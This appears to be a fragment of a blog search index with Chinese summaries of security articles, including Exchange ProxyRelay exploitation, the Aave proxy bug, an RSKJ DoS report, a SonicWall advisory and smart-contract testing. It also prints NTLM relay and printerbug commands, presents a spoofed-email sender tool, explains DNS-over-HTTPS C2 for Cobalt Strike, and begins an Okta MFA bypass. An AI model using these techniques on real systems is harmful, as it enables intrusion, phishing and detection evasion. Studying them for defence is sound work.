dows%E5%91%BD%E4%BB%A4/","title":"俄罗斯APT28新型恶意软件利用LLM生成恶意Windows命令"},{"content":"MS Exchange新攻击面分析第四部：ProxyRelay！\r这是来自DEVCORE的交叉发布博客。完整系列包括：\nMS Exchange新攻击面分析第一部：ProxyLogon！ MS Exchange新攻击面分析第二部：ProxyOracle！ MS Exchange新攻击面分析第三部：ProxyShell！ MS Exchange新攻击面分析第四部：ProxyRelay！ 背景说明\r这篇迟来的文章原本可以更早发布（原始漏洞于2021年6月报告给MSRC，遵循90天公开披露政策）。在与MSRC沟通期间，他们解释由于这是架构设计问题，需要进行大量代码修改和测试，因此希望通过累积更新(CU)而非常规补丁周二一次性解决。我们理解这一情况并同意延长截止日期。\n微软最终于2022年4月20日发布Exchange Server 2019 CU 12和Exchange Server 2016 CU 23，但该补丁默认未启用。直到2022年8月9日微软才发布补丁激活方法。我们本有机会在Pwn2Own Vancouver 2021展示攻击，但出于安全研究初衷放弃了参赛计划。\n技术原理\r自2021年4月微软封堵Proxy系列攻击后，我们一直在探索绕过方案。当时微软通过增强CAS前端认证机制，要求所有需要Kerberos票据的HTTP请求必须先通过认证，有效阻止了未经认证的请求访问CAS后端。但Exchange真的安全了吗？\n我们借鉴了打印机漏洞(Printer Bug)的思路：在Exchange架构中，后端通过检查登录身份是否拥有ms-Exch-EPI-Token-Serialization扩展权限来授权HTTP请求。由于Exchange服务器在安装时会自动加入Exchange Servers组，该组所有对象默认拥有此权限。\n漏洞利用\r我们发现了完整的攻击面而非单个漏洞，由此衍生出多个CVE：\nCVE-2021-33768 - 中继到Exchange前端 CVE-2022-21979 - 中继到Exchange后端 CVE-2021-26414 - 中继到Exchange DCOM CVE-2022-RESERVED - 中继到其他Exchange服务 第一轮：中继到Exchange前端\r通过强制EX01发起SMB连接，使用ntlmrelayx.py将NTLM认证中继到EX02前端的EWS服务。由于中继身份是拥有Token-Serialization权限的机器账户，我们可以模拟任意用户：\n1 2 3 4 5 # 终端1 $ python ntlmrelayx.py -smb2support -t https://EX02/EWS/Exchange.asmx # 终端2 $ python printerbug.py EX01 ATTACKER 微软通过在前端代理处理程序添加IsSystemOrMachineAccount()检查来修复此问题（CVE-2021-33768）。\n第二轮：中继到Exchange后端\r后端验证更为复杂，我们展示了三种攻击方式：\n攻击后端/EWS：只需将目标端口从443改为444 攻击后端/RPC：通过RPC-over-HTTP协议操作邮箱 攻击后端/PowerShell：实现类似ProxyShell的利用链 微软通过强制启用IIS的扩展保护认证修复此问题（CVE-2022-21979）。\n第三轮：中继到Windows DCOM\r基于Exchange服务器在AD环境中的组继承特性，EX01$机器账户也是EX02的本地管理员。通过中继到MS-DCOM可以实现RCE。微软分三个阶段逐步修复此问题（CVE-2021-26414）。\n时间线\r详细披露过程包括：\n2021年6月2日：通过MSRC门户报告漏洞 2022年4月20日：发布Exchange补丁 2022年8月18日：最终发布CVE和补丁激活文档 结语\r这个系列研究历时两年，期间经历了漏洞碰撞、Pwn2Own竞赛、顶级会议演讲等事件。我们始终秉持安全研究的初心，希望通过这些发现帮助提升Exchange服务器的安全性。\n","date":"2025-08-02T21:26:58+08:00","permalink":"http://localhost:1313/p/ms-exchange%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%E7%AC%AC%E5%9B%9B%E9%83%A8proxyrelay%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/","title":"MS Exchange新攻击面分析第四部：ProxyRelay技术揭秘"},{"content":"可复用的以太坊合约属性测试\r随着智能合约安全技术的演进，基于属性的模糊测试已成为开发者和安全工程师的核心技术。该技术依赖代码属性（通常称为不变量）的创建，这些属性描述了代码的预期行为。为帮助社区定义属性，我们发布了168个预构建属性集，可用于指导我们的智能合约模糊测试工具Echidna，或直接通过单元测试使用。覆盖范围包括：\n常见ERC代币接口合规性 通用可测试安全属性 定点数学运算测试属性 实战直播安排\r为帮助掌握这些工具，我们将举办两场直播：\n3月7日：ERC20属性、示例用法和Echidna作弊码（Guillermo Larregay主讲） 3月14日：ERC4626属性、示例用法及高效模糊测试技巧（Benjamin Samuels主讲） 为什么需要使用？\r该资源库及配套研讨会将展示模糊测试如何提供比单元测试更高级别的安全保障。这些属性集可轻松集成到使用知名标准或常用库的项目中，当前包含：\nABDKMath64x64库测试 ERC-20代币标准 ERC-4626代币化金库标准 核心测试内容\rERC20\n标准接口函数属性 基础合理性属性（如：用户余额不应超过代币供应量） 可销毁、可铸造、可暂停等扩展功能属性 ERC4626\n符合规范的舍入方向验证 禁止回退函数的属性 差分测试属性（如deposit()必须与previewDeposit()预测功能匹配） 非规范安全属性（份额通胀攻击、代币授权检查等） ABDKMath64x64\n交换律、结合律、分配律和恒等属性 差分测试属性（如2^(-x) == 1/2^(x)） 输入范围回退验证 区间属性（如min(x,y) \u0026lt;= avg(x,y) \u0026lt;= max(x,y)） 快速开始指南\r安装Echidna 导入属性库： Hardhat项目：npm install https://github.com/crytic/properties.git Foundry项目：forge install crytic/properties 按文档创建测试合约 ERC20测试合约示例\r1 2 3 4 5 6 7 8 9 pragma solidity ^0.8.0; import \u0026#34;./YetAnotherCashEquivalentToken.sol\u0026#34;; import {ICryticTokenMock} from \u0026#34;@crytic/properties/contracts/ERC20/external/util/ITokenMock.sol\u0026#34;; contract CryticERC20ExternalHarness is CryticERC20ExternalBasicProperties { constructor() { token = ICryticTokenMock(address(new CryticTokenMock())); } } Echidna配置文件\r1 2 3 4 corpusDir: \u0026#34;tests/erc20/echidna-corpus\u0026#34; testMode: assertion testLimit: 100000 sender: [\u0026#34;0x10000\u0026#34;, \u0026#34;0x20000\u0026#34;, \u0026#34;0x30000\u0026#34;] 运行命令：echidna-test . --contract CryticERC20ExternalHarness --config echidna.yaml\n未来计划\r扩展数学库测试（如PRBMath） 增加更多ERC标准测试 构建AMM/流动性池等通用合约测试集 本文档所有技术内容均基于Trail of Bits官方发布材料，无AI虚构内容。\n","date":"2025-08-02T21:15:46+08:00","permalink":"http://localhost:1313/p/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E5%8F%AF%E5%A4%8D%E7%94%A8%E5%B1%9E%E6%80%A7%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/","title":"以太坊智能合约的可复用属性测试指南"},{"content":"Breaking Aave Upgradeability\r2020年12月3日，Aave部署了其代码库的V2版本。虽然我们未被雇佣进行代码审计，但在次日我们对其进行了简要检查。我们迅速发现了一个同时影响V1和V2线上合约的漏洞并立即报告。Aave团队在收到分析报告后一小时内就修复了该漏洞。若被利用，该漏洞将摧毁Aave系统并影响外部DeFi合约中的资金。\n尽管有五家安全公司（包括使用形式化验证的机构）审计过Aave代码库，但此漏洞仍被遗漏。本文将详述该漏洞原理、为何未被发现以及经验教训。同时我们开源了新的Slither检测器以提升以太坊生态安全性。\n漏洞原理\rAave使用了我们此前多次讨论的delegatecall代理模式。该模式将组件分为：1)包含实现逻辑的逻辑合约；2)包含数据并通过delegatecall与逻辑合约交互的代理合约。用户与代理合约交互，而代码在逻辑合约执行。以下是简化示意图：\n在Aave中，LendingPool(LendingPool.sol)是采用delegatecall代理的可升级组件。该漏洞依赖两个关键特性：\n逻辑合约的函数（包括初始化函数）可直接调用 借贷池自身具有delegatecall能力 可升级合约初始化\r这种升级模式的限制在于代理合约无法依赖逻辑合约的构造函数进行初始化。因此状态变量和初始设置必须在公开的初始化函数中完成，这些函数无法享受构造函数的保护机制。\n在LendingPool中，initialize函数设置provider地址(_addressesProvider)：\n1 2 3 function initialize(ILendingPoolAddressesProvider provider) public initializer { _addressesProvider = provider; } initializer修饰符防止多次调用initialize，要求满足以下条件：\n1 2 3 4 require( initializing || isConstructor() || revision \u0026gt; lastInitializedRevision, \u0026#39;Contract instance has already been initialized\u0026#39; ); 其中：\ninitializing允许同一交易内多次调用 isConstructor()供代理合约执行代码所需 revision \u0026gt; lastInitializedRevision允许合约升级时再次调用初始化函数 通过代理调用时工作正常，但第三条也允许任何人直接调用逻辑合约的initialize函数。当逻辑合约部署后：\nrevision为0x2 lastInitializedRevision为0x0 漏洞本质：任何人都能设置LendingPool逻辑合约的_addressesProvider。\n任意delegatecall\rLendingPool.liquidationCall直接delegatecall到_addressProvider返回的地址：\n1 2 3 4 5 6 7 8 9 10 11 address collateralManager = _addressesProvider.getLendingPoolCollateralManager(); (bool success, bytes memory result) = collateralManager.delegatecall( abi.encodeWithSignature( \u0026#39;liquidationCall(address,address,address,uint256,bool)\u0026#39;, collateralAsset, debtAsset, user, debtToCover, receiveAToken ) ); 这使得攻击者可：\n初始化LendingPool逻辑合约 设置受控的addresses provider 执行任意代码（包括selfdestruct） 攻击场景：任何人都能销毁借贷池逻辑合约。简化示意图如下：\n存在性检查缺失\r该漏洞本身已足够严重（可类比Parity事件）。但OpenZeppelin代理合约的使用放大了危害。我们2018年的博文曾指出：对空合约的delegatecall会返回success但不会执行任何代码。尽管有此警告，OpenZeppelin仍未修复其代理合约的回退函数：\n1 2 3 4 5 6 7 function _delegate(address implementation) internal { assembly { calldatacopy(0, 0, calldatasize) let result := delegatecall(gas, implementation, 0, calldatasize, 0, 0) ... } } 若代理合约delegatecall到已被销毁的逻辑合约，代理将返回success但实际未执行任何代码。虽然Aave可通过更新代理指向新逻辑合约来修复，但在漏洞存在期间，任何第三方合约调用借贷池时都会误认为代码已执行。\n受影响合约\r所有AToken：用户燃烧AToken但无法取回底层资产 WETHGateway：存款会存储在网关中导致资产被盗 基于Aave Credit Delegation v2的所有代码库 其他受影响的外部合约包括：\nDefiSaver v1/v2 PieDao等 这凸显了DeFi可组合性的潜在风险。\n修复建议\r幸运的是漏洞在被利用前就被修复。Aave调用了两个版本借贷池的initialize函数进行加固：\nV1修复时间：2020-12-04 19:34:26 UTC V2修复时间：2020-12-04 19:53:00 UTC 长期建议：\n在所有逻辑合约中添加构造函数禁用initialize函数 在代理合约的回退函数中添加合约存在性检查 仔细审查delegatecall陷阱并使用slither-check-upgradeability 形式化验证非万能\rAave代码库经过\u0026quot;形式化验证\u0026quot;，但该漏洞证明安全属性并非绝对。验证报告中的属性（如操作成功时返回true不回滚）在逻辑合约被销毁时就会失效。可能原因包括：\n验证未考虑可升级性 验证工具不支持复杂合约交互 形式化技术虽好，但需注意其覆盖范围有限。相比之下，自动化工具（如Slither）和人工审计能以较少资源实现更高安全保证。\n结论\rAave反应迅速值得肯定，但其他项目就没这么幸运。我们建议开发者在部署前：\n参考我们的安全清单和培训材料 将Slither加入CI流程并检查所有报告 给予安全团队充足的审计时间 谨慎处理可升级性，至少阅读相关反模式文档 我们通过公开此漏洞和Slither检测器希望预防类似错误。安全是持续过程，建议项目启动前联系我们进行安全审计。\n","date":"2025-08-02T21:04:25+08:00","permalink":"http://localhost:1313/p/%E6%8F%AD%E7%A7%98aave%E5%8F%AF%E5%8D%87%E7%BA%A7%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E-%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E8%87%B4%E5%91%BD%E7%BC%BA%E9%99%B7/","title":"揭秘Aave可升级合约漏洞 - 代理模式下的致命缺陷"},{"content":"代码复杂性的解决本质\r一个看似简单却蕴含深意的观点：只有个体程序员能真正解决代码复杂性。这意味着：\n需要开发者对代码投入专注力 工具只是辅助，最终依赖人类智能的运用 本质上是需要个体贡献者层面的细致工作 当管理者仅笼统要求\u0026quot;简化代码\u0026quot;时往往无效，因为：\n指令缺乏具体性 管理者缺乏对每段代码的深入了解 问题理解过程本身就是解决方案的一部分 管理层的常见误区\r高层管理者（如CTO/技术副总）若只给出\u0026quot;提高代码质量\u0026quot;这类宽泛指令，往往导致：\n团队产生大量无效动作 代码库质量未见实质提升 常见错误模式包括：\n试图用统一方案解决所有复杂性问题 忽视问题由多个需要精细处理的小项目组成 最终导致工程师感觉付出努力却未产出可维护代码 可操作的解决框架\r问题收集阶段\n让每位团队成员列出代码中最令人沮丧的部分 关注症状而非原因：如\u0026quot;修改时令人紧张的模块\u0026quot; 给予数天时间自由记录，不强制格式 问题定位会议\n6-7人规模的小组会议 将每个症状关联到具体代码单元（文件/类/方法） 示例：将\u0026quot;缺乏单元测试\u0026quot;转化为\u0026quot;X模块重构时无法验证兼容性\u0026quot; 问题跟踪与优先级\n为每个确认的问题创建工单（仅描述问题） 优先级考量： 影响开发者数量与严重程度 问题间的依赖关系（关键排序常被忽视） 技术负责人应主导依赖关系分析 任务分配与执行\n常规功能开发中持续穿插代码清理 每个开发周期（如季度）包含相关清理任务 理想顺序：先清理阻碍当前功能开发的代码 技术债务的真相\r即时成本：拙劣决策在数小时/天/周内就会产生影响 时间假象：正确实现与错误实现耗时通常相当 复合效应：持续优化保持系统弹性，临时捷径会产生\u0026quot;无法移动的巨石\u0026quot; 持续改进的关键\r避免完全停止功能开发来\u0026quot;大扫除\u0026quot; 保持代码质量工作的持续投入 建立\u0026quot;边开发边优化\u0026quot;的文化节奏 作者后记：这套方法需要结合常识与经验灵活运用，但已足够显著改善代码库质量。如需深度指导，可联系作者进行企业内训。\n","date":"2025-08-02T20:47:42+08:00","permalink":"http://localhost:1313/p/%E8%BD%AF%E4%BB%B6%E5%85%AC%E5%8F%B8%E5%A6%82%E4%BD%95%E5%BA%94%E5%AF%B9%E4%BB%A3%E7%A0%81%E5%A4%8D%E6%9D%82%E6%80%A7%E4%BB%8E%E4%B8%AA%E4%BD%93%E8%B4%A1%E7%8C%AE%E8%80%85%E5%88%B0%E7%AE%A1%E7%90%86%E5%B1%82%E7%9A%84%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97/","title":"软件公司如何应对代码复杂性：从个体贡献者到管理层的实践指南"},{"content":"政府现有反欺诈措施的局限性\r英国政府部门目前拥有28个数据共享协议用于欺诈检测，但国家审计署(NAO)最新报告指出，这些措施过度依赖事后追查，缺乏预防性控制机制。现有数据分析工具主要用于识别已发生的错误支付，而非嵌入业务流程的前端预防。\n技术应用的经济效益\r2023-24年度英国因欺诈和错误导致的财政损失高达550-810亿英镑。报告显示，从基础的去重检查到人工智能风险交易识别，数据分析技术能确保资金准确流向合法接收方。NAO特别强调：\u0026ldquo;高质量关联数据可使新技术快速实现投资回报，无需等待整体数字转型完成。\u0026rdquo;\n数据共享的体制障碍\r报告揭示三大核心问题：\n国家欺诈倡议等中央数据平台使用率不足，主因是官员认知不足及成本顾虑 反欺诈团队对可用数据集缺乏了解 数据格式与系统的不一致性严重阻碍分析效率 关键建议与技术路线\r强制性数据共享：财政部应强制使用国家欺诈倡议，并与公共部门欺诈管理局(PSFA)共同制定中央工具使用标准 跨系统安全架构：建议PSFA与政府数字服务署(GDS)基于《2017年数字经济法案》建立受控数据共享流程，防范欺诈者跨系统渗透 私有数据源整合：提议引入Cifas等第三方欺诈数据库增强监测能力 数字转型的未竟之路\r尽管GDS的《现代数字政府蓝图》包含反欺诈数据分析愿景，但NAO指出其缺乏具体实施计划，特别是在欺诈数据分析维度尚未建立系统框架。报告警告，随着数据共享范围扩大，必须建立清晰的持续治理机制来管理跨系统访问风险。\n","date":"2025-08-02T20:36:32+08:00","permalink":"http://localhost:1313/p/%E8%8B%B1%E5%9B%BD%E5%9B%BD%E5%AE%B6%E5%AE%A1%E8%AE%A1%E7%BD%B2%E5%BB%BA%E8%AE%AE%E6%94%BF%E5%BA%9C%E8%BF%90%E7%94%A8%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%89%93%E5%87%BB%E6%AC%BA%E8%AF%88%E8%A1%8C%E4%B8%BA/","title":"英国国家审计署建议政府运用数据分析技术打击欺诈行为"},{"content":"RSKJ服务器拒绝服务漏洞报告\r漏洞摘要\r攻击者通过发送特制的UDPv6数据包可导致RSKJ服务器停止处理网络流量，最终引发内存耗尽崩溃。\n复现步骤\r下载受影响版本：https://github.com/rsksmart/rskj/releases/download/FINGERROOT-5.0.0/rskj-core-5.0.0-FINGERROOT-all.jar 服务端运行： 1 java -classpath rskj-core-5.0.0-FINGERROOT-all.jar -Drpc.providers.web.cors=* -Drpc.providers.web.ws.enabled=true co.rsk.Start 该命令会开放UDPv6端口5050 客户端安装Python3及pysha3库，使用PoC脚本攻击服务端 服务器将永久处理单个UDP数据包，拒绝其他节点请求，数分钟后应用崩溃 根本原因\rbytesToLength函数返回-5导致length变为0：\n1 2 3 4 5 6 // RLP.java第432行 bytesToLength返回-5 // 第440行 该返回值被合法接受 // 第403-405行 position变量无法更新 影响\rUDPv6端口5050停止处理入站流量 最终导致内存耗尽崩溃 由于decode2函数的广泛使用，可能影响其他服务入口点 修复方案\r限制bytesToLength仅返回非负值 添加长度校验（建议）： 1 2 if(size \u0026gt; Integer.BYTES) throw new Exception(...); 修复提交\rhttps://github.com/rsksmart/rskj/commit/6965fa60f743d911ee106b542cec80a1417266b1\n漏洞奖励\r$5,000\n","date":"2025-08-02T20:25:35+08:00","permalink":"http://localhost:1313/p/rskj%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D/","title":"RSKJ服务器拒绝服务漏洞分析与修复"},{"content":"超越私钥风险：智能合约安全成熟度进阶\r\u0026ldquo;找出所有漏洞！\u0026rdquo;\n这是大多数协议在部署智能合约前的安全口号。团队投入巨资进行审计、竞赛、模糊测试和形式化验证，试图发现每个潜在漏洞。但去年加密货币被盗的最大原因并非智能合约漏洞——而是私钥泄露！\n私钥攻击已成头号威胁\r根据Chainalysis 2024年报告，43.8%的被盗资金源于私钥泄露，是其他攻击类型的五倍之多。私钥泄露已成为每个工程师设计新智能合约时必须考虑的新兴威胁。\n传统区块链安全审计往往忽视架构层面的访问控制风险。与其他行业不同，区块链安全评估很少将权限升级和访问控制设计作为核心关注点。Trail of Bits通过代码库成熟度评估标记架构问题，但多数协议直到开发生命周期末期才寻求外部审查。\n案例研究：超额抵押借贷平台\r我们以理论上的超额抵押借贷平台为例，展示不同成熟度的访问控制设计：\n等级1：高风险暴露 - 单一EOA控制器\r单个外部账户(EOA)控制所有管理功能 私钥可能存储在联网的软件钱包中 成熟度等级1：单点故障，一旦私钥泄露即导致协议完全沦陷 等级2：基础缓解 - 中心化多签\r管理权转移至多签钱包（如M-of-N Safe Wallet） 成熟度等级2：需要多个签名，但仍存在单一控制点 改进：单个签名者密钥泄露不足以致命 风险：足够多签名者被攻陷仍可立即执行恶意操作 等级3：增强控制 - 时间锁与角色分离\r实施时间锁合约（执行延迟）和最小权限原则(PoLP) 成熟度等级3：深度防御体系 典型协议：Aave、Compound Finance、Lido 关键角色： 核心系统角色（合约升级）：高门槛多签+长时间锁 运营角色（日常配置）：中等时间锁和签名门槛 暂停监护角色（紧急暂停）：无时间锁+低门槛 取消监护角色（中止交易）：安全团队控制 等级4：终极形态 - 彻底不可变与用户主权\r完全消除管理操作需求 成熟度等级4：近乎无控制点的不可变系统 典型协议：Uniswap、Liquity 设计挑战： 合约完全不可升级（需部署新系统） 资产上架需独立部署新市场 风险参数永久固定或算法决定 优势：彻底消除访问控制风险 设计韧性而非被动应对\r2024年43.8%的被盗资金证明，忽视架构级访问控制已不可接受。建议立即行动：\n对照成熟度框架评估当前协议 为高风险功能实施时间锁并确保监控 按最小权限原则划分特权功能 考虑部分组件采用等级4不可变模式 在Trail of Bits，我们提倡这种安全整体观。通过设计审查和早期咨询等服务，帮助团队主动解决这些基础问题。构建安全的去中心化系统不仅需要漏洞狩猎，更需从第一天就开始设计运营韧性。\n","date":"2025-08-02T20:14:41+08:00","permalink":"http://localhost:1313/p/%E8%B6%85%E8%B6%8A%E7%A7%81%E9%92%A5%E9%A3%8E%E9%99%A9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E6%88%90%E7%86%9F%E5%BA%A6%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97/","title":"超越私钥风险：智能合约安全成熟度进阶指南"},{"content":"[Python] [PHP] 伪造邮件发送工具(SEMS)\r今天我要向大家展示另一个我在空闲时间完成的趣味项目——伪造邮件发送工具。与其他工具不同，该工具使用PHP mail()函数处理邮件，因此需要支持PHP mail()功能的主机服务来托管邮件处理器。\n使用前准备\r在使用此工具前，您需要将mailhandler文件夹中的两个文件(index.php和send.php)托管在支持PHP mail()功能的主机服务上。否则该工具将无法工作。\n完成后，工具会要求输入邮件处理器URL(仅首次使用时)。您需要复制已托管的send.php文件URL并粘贴到输入框中。\n工具使用方法\r1 2 3 4 5 6 7 8 9 10 11 usage: python3 sems.py [-h] [--sN SN] [--sE SE] [--rE RE] [--sub SUB] [--msg MSG] Simple Port Scanner for scanning TCP ports in target hosts optional arguments: -h, --help show this help message and exit --sN SN Sender Name (Eg: \u0026#34;John Cena\u0026#34;) --sE SE Sender E-Mail Address (Eg: johncena@wwe.com) --rE RE Recipient E-Mail Address (Eg: chan.96@gmail.com) --sub SUB Type Subject (Eg: \u0026#34;See Me Chan\u0026#34;) --msg MSG Type Message (Eg: \u0026#34;You can see me brother. I know that.\u0026#34;) 希望您会喜欢我的代码。此工具可自由修改，您可以按需进行任何更改。我已为此创建了GitHub仓库。\n您可以通过以下链接查看和下载： https://github.com/clasiru/Spoofed_E-Mail_Sender\n","date":"2025-08-02T20:03:36+08:00","permalink":"http://localhost:1313/p/python%E4%B8%8Ephp%E5%AE%9E%E7%8E%B0%E7%9A%84%E4%BC%AA%E9%80%A0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E5%B7%A5%E5%85%B7sems/","title":"Python与PHP实现的伪造邮件发送工具(SEMS)"},{"content":"SonicWall Secure Mobile Access (SMA) 100系列管理界面多重漏洞可能导致远程代码执行\rMS-ISAC公告编号：2025-046\n发布日期：2025/05/05\n概述\rSonicWall Secure Mobile Access (SMA) 100管理界面发现多个安全漏洞，可能导致远程代码执行。SonicWall SMA是企业用于提供远程应用访问的统一安全网关。攻击者组合利用这些漏洞可实现远程代码执行，进而导致会话劫持和系统完全沦陷。\n威胁情报\rWatchTowr报告显示CVE-2024-38475和CVE-2023-44221已在真实攻击中被利用。CISA已将这两个漏洞列入已知被利用漏洞目录(KEV)。\n受影响系统\rSMA 200 SMA 210 SMA 400 SMA 410 SMA 500v 风险等级\r政府机构：中大型政府实体(高危)/小型政府实体(中危) 企业：中大型企业(高危)/小型企业(中危) 家庭用户：低危 技术细节\r漏洞详情如下：\n攻击策略：初始访问(TA0001)\n技术手段：利用公开应用漏洞(T1190)：\nSMA100 SSL-VPN管理界面存在特殊元素过滤不当漏洞，具有管理员权限的远程攻击者可注入任意命令(CVE-2023-44221) Apache HTTP Server 2.4.59及更早版本的mod_rewrite存在输出转义缺陷，攻击者可映射URL到服务器允许访问的文件系统位置(CVE-2024-38475) 组合利用这些漏洞可实现远程代码执行。\n修复建议\r立即应用补丁：测试后立即安装SonicWall提供的更新(M1051)\n保障措施7.1：建立并维护漏洞管理流程 保障措施7.2：建立基于风险的修复策略 自动化漏洞管理：\n保障措施7.4：每月执行自动化应用补丁管理 保障措施7.5：每季度执行自动化漏洞扫描 网络架构加固：\n保障措施12.1：保持网络基础设施更新 保障措施12.2：建立安全网络架构 渗透测试：\n保障措施18.1：建立渗透测试计划 保障措施18.2：定期执行外部渗透测试 最小权限原则：\n保障措施4.7：管理默认账户 保障措施5.5：维护服务账户清单 应用防护：\n保障措施16.13：执行应用渗透测试 保障措施10.5：启用防漏洞利用功能 参考链接\rCISA公告 CVE-2024-38475 CVE-2023-44221 SonicWall安全公告 ","date":"2025-08-02T19:42:30+08:00","permalink":"http://localhost:1313/p/sonicwall-sma-100%E7%B3%BB%E5%88%97%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%E5%A4%9A%E9%87%8D%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"SonicWall SMA 100系列管理界面多重漏洞可能导致远程代码执行"},{"content":"DNS Over HTTPS for Cobalt Strike\r引言\r近年来，红队行动中C2基础设施的搭建变得越来越困难。这对安全社区来说是件好事，因为这意味着厂商和专业从业者已经从过去成功的技术中吸取教训，并在网络中实施了有效的缓解措施。\nDNS over HTTPS（DoH）是一个未被充分重视的命令控制通道。本文将展示如何在Cobalt Strike中使用DoH，这种方式无需第三方账户或基础设施设置，通过有效的SSL证书加密流量，并将通信发送到信誉良好的域名。\n现有技术\r攻击者和攻防安全专业人员使用不同的重定向器实现已有一段时间。最早使用的重定向器是配置了各种转发规则的简单Apache和Nginx服务器。\n重定向器不仅能增强基础设施的弹性，还能绕过依赖域名分类的防御措施。例如，当内容分发网络（CDN）对开发者更易获取后，攻击者就从传统重定向器转向这些平台，因为它们通常提供有效域名甚至SSL证书，减少了攻击者的工作量。\n后来出现的\u0026quot;域名伪装\u0026quot;技术被许多测试者大量使用。但最近CDN提供商开始打击这种行为。许多网站完全禁止域名伪装或主动搜索使用该技术的人。特别是微软，曾在行动中直接关闭Azure订阅。\nDNS over HTTPS\r传统DNS信标相对容易被检测。我从未在行动中使用过Cobalt Strike的DNS监听器，仅限于之前描述的HTTPS监听器和重定向器。\n通过DoH实现的Beacon为我们提供了信誉良好的域名和有效的SSL证书，无需账户或重定向器配置。这进一步减少了操作员的设置时间，并消除了账户被关闭的风险。\n今日主题：Cobalt Strike中的DNS over HTTPS\rAustin Hudson首次在Twitter上向我介绍了DoH的使用。他过去一年的推文详细记录了实现这一功能的进展，并最终开发出开源工具TitanLdr。这个Cobalt Strike用户定义反射加载器（UDRL）通过钩取Beacon的导入地址表（IAT），将负责传统DNS查询的API调用（DNSQuery_A）替换为向dns.google（8.8.8.8和8.8.4.4）发送DoH请求的函数。\n仅这一点就是极佳的能力，但TitanLdr的DNSQuery_A钩子具有足够通用性，可与许多不同的DoH服务器配合使用！我已测试以下域名并确认它们可作为即插即用的替代方案：\ndns.quad9.net mozilla.cloudflare-dns.com cloudflare-dns.com doh.opendns.com ordns.he.net 使用TitanLdr\rTitanLdr是将此功能集成到Cobalt Strike的关键。原始版本的TitanLdr可通过单一DNS提供商进行HTTPS通信：https://github.com/secidiot/TitanLdr。您可以在hooks目录下的DnsQuery_A.c文件第111行更改DNS服务器。\n我还fork了TitanLdr以支持指定多个DoH服务器。每次回调时，Beacon会从硬编码列表中随机选择一个。如需使用多个DoH服务器，可从https://github.com/kyleavery/TitanLdr下载我的fork版本。hooks目录下DnsQuery_A.c文件的第116行可修改服务器列表。\n下载后需要构建程序，这需要安装NASM和MinGW的Linux主机。安装这些程序后，运行make命令创建必要文件。\n将Titan.cna Aggressor脚本导入Cobalt Strike后，即可使用DoH！像往常一样配置DNS监听器。Cobalt Strike文档对此监听器的配置有更详细介绍。\nDNS over HTTPS的缺点\r虽然DoH信标相比传统HTTPS信标有优势，但也存在明显缺点：\n首先，传输相同信息需要更多数据包。DNS TXT记录最多只能包含255个字符，意味着每个数据包只能发送少量数据。\n其次，我们对可用服务器的路径或域名没有控制权。环境或设备拒绝向流行或已知DoH服务器发送443/TCP出站流量，比阻止Microsoft的*.azurewebsites.net或Cloudflare的*.workers.dev似乎更容易。可以通过使用更冷门的DoH服务器或自行构建并随时间推移进行分类来解决此问题，具体取决于环境配置。\n潜在检测方法\r当前检测技术在检测DNS over HTTPS方面可能存在漏洞：\n针对恶意HTTPS流量的检测通常利用域名信誉，对DoH可能无效，因为使用的域名信誉良好 针对恶意DNS流量的检测通常监控大量DNS请求，对DoH可能无效，因为流量不再使用DNS协议 传统DNS监控与SSL检查相结合可能是潜在解决方案，但我目前不知道有任何工具或产品这样做。\n我认为防御此攻击的主要方法是阻止向组织未使用的已知DoH服务器发送443/TCP出站流量。我遇到的大多数网络仍使用传统DNS，通常作为Active Directory环境一部分运行本地DNS服务器。这种情况下，无需允许向dns.google、cloudflare-dns.com或本文提到的其他服务器发送HTTPS流量。\n结束语\r绝对有更多DNS over HTTPS服务器可用于此配置。此外，用户可以设置自己的DoH服务器，甚至可能位于CDN或其他云服务后面，以引入此技术的变体。\nTitanLdr仅限于Cobalt Strike，但DoH实现可以移植到任何其他C2框架。这种方法并非在所有情况下都是最佳选择，但它是我希望您能利用的工具箱中的另一个工具。如有任何问题或意见，请通过Twitter @kyleavery_与我联系。\n","date":"2025-08-02T19:21:02+08:00","permalink":"http://localhost:1313/p/%E5%9C%A8cobalt-strike%E4%B8%AD%E5%88%A9%E7%94%A8dns-over-https%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%94%BD%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6/","title":"在Cobalt Strike中利用DNS over HTTPS实现隐蔽命令控制"},{"content":"绕过Windows版Okta多因素认证凭证提供程序\r发布日期：2023年2月16日\n需要提前说明的是，这是一项后渗透技术，主要适用于已通过其他方式获取系统管理员权限后，希望在不触发MFA的情况下进行RDP连接的场景。\n技术背景\rOkta MFA凭证提供程序通过多因素认证强化远程桌面协议(RDP)的安全验证。启用该功能后，访问已加入域的Windows工作站和服务器时，RDP客户端会强制要求MFA验证。\n（参考：Okta官方文档）\n与Duo方案的差异\r本技术与作者此前发布的《绕过Duo双因素认证》方法类似，但存在关键差异：\nOkta默认不启用\u0026quot;故障开放\u0026quot;（fail open）模式 默认配置不限于RDP场景，因此控制台绕过成功率较低 技术实现\r在已获取管理员权限的shell中，可通过以下步骤禁用MFA验证：\n定位配置文件路径： C:\\Program Files\\Okta\\Okta Windows Credential 